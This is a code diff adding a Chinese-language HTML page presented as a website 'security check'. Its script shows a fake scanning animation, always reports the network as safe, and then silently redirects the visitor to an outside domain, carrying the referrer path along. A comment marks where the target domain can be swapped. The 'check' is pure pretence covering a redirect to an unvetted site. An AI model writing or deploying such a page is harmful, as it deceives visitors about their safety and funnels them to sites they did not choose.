@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Security</title>
+    </head>
+    <link rel="stylesheet" href="css/style.css" />
+
+    <body>
+        <div class="wrapper">
+            <div class="top">
+                <img class="image" src="images/check.png" alt="" />
+                <div class="loaderText">
+                    <div class="text">点击进行安全检测</div>
+                </div>
+            </div>
+            <div class="bottom">
+                <button id="btn" onclick="handleDetect()">开始检测</button>
+                <div class="notice">安全软件提供技术支持</div>
+                <!-- <div class="notice">
+                    copyright ©2023 Website Detection All Rights Reserved
+                </div> -->
+            </div>
+        </div>
+    </body>
+    <script>
+        const handleDetect = () => {
+            document.getElementById("btn").disabled = true;
+            document.getElementsByClassName("loaderText")[0].innerHTML =
+                '<div class="text">进行安全检测中</div><div class="loader"></div>';
+            toOk();
+        };
+
+        let toOk = function () {
+            setTimeout(function () {
+                document.getElementsByClassName("loaderText")[0].innerHTML =
+                    '<div class="text">安全检测完成，网络状况良好</div>';
+                toLink();
+            }, 1000);
+        };
+
+        let toLink = function () {
+            setTimeout(function () {
+                let index = Math.floor(Math.random() * 10) % 1;
+                // 域名更改
+                let domains = ["xf9866.com"]; 
+                referer = document.referrer
+                    .replace(/^http:?\/\//i, "")
+                    .replace("/", "");
+                if (domains[index] != "") {
+                    window.location.href =
+                        "https://" + domains[index] + referer;
+                }
+            }, 1000);
+        };
+    </script>
+</html>
